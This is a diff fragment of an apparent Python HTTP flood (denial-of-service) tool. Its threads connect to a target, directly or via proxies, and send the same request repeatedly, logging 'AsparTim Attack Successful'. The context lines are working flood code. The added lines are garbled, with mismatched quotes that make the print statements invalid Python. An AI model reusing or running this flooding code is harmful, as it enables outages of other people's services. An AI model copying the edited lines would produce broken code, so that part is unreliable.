@@ -350,7 +350,7 @@ class RequestProxyHTTP(threading.Thread):
 				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
 				s.connect((str(proxy[0]), int(proxy[1]))) 
 				s.send(str.encode(request))
-				print ("\033[92m",time.ctime(time.time())," AsparTim Attack Successful " + str(proxy[0]+":"+proxy[1]) + " ✓")
+				print (",time.ctime(time.time()),"AsparTim Attack Successful " + str(proxy[0]+":"+proxy[1]) + " ✓")
 				try:
 					for y in range(multiple): 
 						s.send(str.encode(request))
@@ -381,7 +381,7 @@ class RequestDefaultHTTP(threading.Thread):
 				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
 				s.connect((str(url2), int(urlport))) 
 				s.send (str.encode(request))
-				print ("\033[92m",time.ctime(time.time())," AsparTim Attack Successful")
+				print (",time.ctime(time.time()),"AsparTim Attack Successful")
 				try:
 					for y in range(multiple):
 						s.send(str.encode(request)) 
